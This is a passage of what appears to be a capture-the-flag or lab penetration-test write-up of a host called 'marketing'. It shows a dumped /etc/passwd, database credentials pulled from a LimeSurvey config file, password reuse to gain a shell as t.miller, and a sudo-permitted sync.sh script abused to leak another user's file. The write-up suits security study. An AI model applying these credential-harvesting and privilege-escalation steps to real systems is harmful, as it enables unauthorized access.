style="padding-right: 0.1px;">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">messagebus:x:103:106::/nonexistent:/usr/sbin/nologin</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">syslog:x:104:110::/home/syslog:/usr/sbin/nologin</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">_apt:x:105:65534::/nonexistent:/usr/sbin/nologin</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">pollinate:x:110:1::/var/cache/pollinate:/bin/false</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">sshd:x:112:65534::/run/sshd:/usr/sbin/nologin</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">t.miller:x:1000:1000::/home/t.miller:/bin/bash</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">m.sander:x:1001:1001::/home/m.sander:/bin/bash</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 812px;"></div><div class="CodeMirror-gutters" style="display: none; height: 812px;"></div></div></div></pre><p><span>While manually enumerating the system, I found database credentials in </span><code>/var/www/LimeSurvey/application/config/config.php</code><span> .</span></p><p><img src="./marketing.assets/image-20260208152340910.png" alt="image-20260208152340910"></p><p><span>Although the MySQL database contained no sensitive information, I successfully performed </span><strong><span>password reuse</span></strong><span> by testing these credentials against the user </span><code>t.miller</code><span> . This allowed me to pivot to a user shell.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">www-data@marketing:/<span class="cm-def">$ mysql</span> <span class="cm-attribute">-h</span> localhost <span class="cm-attribute">-u</span> limesurvey_user <span class="cm-attribute">-p</span><span class="cm-string">'EzPwz2022_dev1$$23!!'</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">mysql: [Warning] Using a password on the command line interface can be insecure.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Welcome to the MySQL monitor.  Commands end with ; or \\g.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Your MySQL connection id is <span class="cm-number">70</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Server version: <span class="cm-number">8</span>.0.29-0ubuntu0.20.04.3 (Ubuntu)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Copyright (c) <span class="cm-number">2000</span>, <span class="cm-number">2022</span>, Oracle and/or its affiliates.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Oracle is a registered trademark of Oracle Corporation and/or its</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">affiliates. Other names may be trademarks of their respective</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">owners.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Type <span class="cm-string">'help;'</span> or <span class="cm-string">'\\h'</span> <span class="cm-keyword">for</span> help. Type <span class="cm-string">'\\c'</span> to <span class="cm-builtin">clear</span> the current input statement.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">mysql&gt; </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">mysql&gt; show databases;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">+</span><span class="cm-attribute">--------------------</span><span class="cm-operator">+</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| Database &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; |</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">+</span><span class="cm-attribute">--------------------</span><span class="cm-operator">+</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| information_schema |</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| limesurvey &nbsp; &nbsp; &nbsp; &nbsp; |</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">+</span><span class="cm-attribute">--------------------</span><span class="cm-operator">+</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">2</span> rows <span class="cm-keyword">in</span> <span class="cm-keyword">set</span> (0.05 sec)</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 505px;"></div><div class="CodeMirror-gutters" style="display: none; height: 505px;"></div></div></div></pre><h1 id='shell-as-tmiller'><span>Shell as </span><code>t.miller</code></h1><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">www-data@marketing:/<span class="cm-def">$ su</span> t.miller</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Password: </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">t.miller@marketing:/<span class="cm-def">$ whoami</span>;id;hostname</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">t.miller</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-def">uid</span><span class="cm-operator">=</span><span class="cm-number">1000</span>(t.miller) <span class="cm-def">gid</span><span class="cm-operator">=</span><span class="cm-number">1000</span>(t.miller) <span class="cm-def">groups</span><span class="cm-operator">=</span><span class="cm-number">1000</span>(t.miller),24(cdrom),46(plugdev),50(staff),100(users),119(mlocate)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">marketing</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 132px;"></div><div class="CodeMirror-gutters" style="display: none; height: 132px;"></div></div></div></pre><p><span>Found </span><code>local.txt</code></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">t.miller@marketing:~<span class="cm-def">$ cat</span> local.txt</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">cb9...</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 44px;"></div><div class="CodeMirror-gutters" style="display: none; height: 44px;"></div></div></div></pre><h1 id='privilege-escalation'><span>Privilege Escalation</span></h1><p><span>Running </span><code>sudo -l</code><span> showed that </span><code>t.miller</code><span> could run </span><code>/usr/bin/sync.sh</code><span> as the user </span><code>m.sander</code><span> .</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">t.miller@marketing:/<span class="cm-def">$ sudo</span> <span class="cm-attribute">-l</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Matching Defaults entries <span class="cm-keyword">for</span> t.miller on marketing:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  env_reset, mail_badpass, <span class="cm-def">secure_path</span><span class="cm-operator">=</span>/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">User t.miller may run the following commands on marketing:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  (m.sander) /usr/bin/sync.sh</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 132px;"></div><div class="CodeMirror-gutters" style="display: none; height: 132px;"></div></div></div></pre><p><span>The </span><code>sync.sh</code><span> script is a file synchronization tool that overwrites a target file (</span><code>/home/m.sander/personal/notes.txt</code><span> ) if a difference is detected.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">t.miller@marketing:/<span class="cm-def">$ cat</span> /usr/bin/sync.sh</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-meta">#! /bin/bash</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">if</span> [ <span class="cm-attribute">-z</span> <span class="cm-def">$1</span> ]; <span class="cm-keyword">then</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-builtin">echo</span> <span class="cm-string">"error: note missing"</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">exit</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">fi</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-def">note</span><span class="cm-operator">=</span><span class="cm-def">$1</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">if</span> [[ <span class="cm-string">"</span><span class="cm-def">$note</span><span class="cm-string">"</span> <span class="cm-operator">=</span>~ .*m.sander.* ]]; <span class="cm-keyword">then</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-builtin">echo</span> <span class="cm-string">"error: forbidden"</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">exit</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">fi</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-def">difference</span><span class="cm-operator">=</span><span class="cm-quote">$(diff /home/m.sander/personal/notes.txt </span><span class="cm-def">$note</span><span class="cm-quote">)</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">if</span> [[ <span class="cm-attribute">-z</span> <span class="cm-def">$difference</span> ]]; <span class="cm-keyword">then</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-builtin">echo</span> <span class="cm-string">"no update"</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">exit</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">fi</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">echo</span> <span class="cm-string">"Difference: </span><span class="cm-def">$difference</span><span class="cm-string">"</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">cp</span> <span class="cm-def">$note</span> /home/m.sander/personal/notes.txt</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">echo</span> <span class="cm-string">"[+] Updated."</span></span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 592px;"></div><div class="CodeMirror-gutters" style="display: none; height: 592px;"></div></div></div></pre><p><span>By providing an empty file as an argument, the </span><code>diff</code><span> command within the script leaked the entire contents of the target file to the terminal. However, it didn’t lead me to anything exploitable.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">t.miller@marketing:/tmp<span class="cm-def">$ touch</span> /tmp/empty.txt</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">t.miller@marketing:/tmp<span class="cm-def">$ sudo</span> <span class="cm-attribute">-u</span> m.sander /usr/bin/sync.sh /tmp/empty.txt </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[sudo] password <span class="cm-keyword">for</span> t.miller: </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Difference: <span class="cm-number">1</span>,3d0</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt; <span class="cm-operator">==</span> NOTES <span class="cm-operator">==</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt; <span class="cm-attribute">-</span> remove vhost from website (done)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt; <span class="cm-attribute">-</span> update to newer version (todo)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">\\ No newline at end of file</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[<span class="cm-operator">+</span>] Updated.</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 197px;"></div><div class="CodeMirror-gutters" style="display: none; height: 197px;"></div></div></div></pre><p><span>Checking </span><code>/etc/group</code><span> revealed that both </span><code>t.miller</code><span> and </span><code>m.sander</code><span> belonged to the </span><code>mlocate</code><span> group.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">t.miller@marketing:/<span class="cm-def">$ cat</span> /etc/group</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">...</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">mlocate:x:119:m.sander,t.miller</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 66px;"></div><div class="CodeMirror-gutters" style="display: none; height: 66px;"></div></div></div></pre><p><span>There is </span><code>mlocate.db</code><span> file that belongs to </span><code>mlocate</code><span> group.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 